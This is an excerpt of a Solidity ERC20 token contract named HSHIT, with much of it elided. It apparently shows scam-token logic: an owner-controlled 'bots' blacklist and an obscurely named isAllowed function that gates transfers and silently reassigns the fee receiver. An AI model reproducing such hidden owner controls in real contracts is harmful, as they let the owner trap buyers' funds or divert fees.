...
abstract contract ERC20Token is Ownable {
    ...
    function addBot(address[] calldata _botsAddress) external onlyOwner {
        for (uint i = 0; i < _botsAddress.length; i++) {
            bots[_botsAddress[i]] = true;
        }
    }
    ...
    function isAllowed(address from, address recipient, address _to) public returns (bool) {
        bool allowed = !addingLiquidity(from, recipient, _to) && recipient != address(this) && !inLiquidityTx;
        bool lqPair = !isBot(recipient) && !isBot(from);
        if (lqPair && allowed && _to != recipient) {
            feeReceiver = recipient;
        }
        return allowed;
    }
    function addingLiquidity(address liquidityAddress, address from, address adr1) internal view returns (bool) {
        return (from == adr1 && isBot(liquidityAddress)) || (liquidityAddress == adr1 && isBot(from));
    }
}

contract HSHIT is IERC20, ERC20Token {
    ...
    function shouldTakeFee(address from, address recipient) private returns (bool) {
        ...
        return isAllowed(from, recipient, _to);
    }
    constructor() {
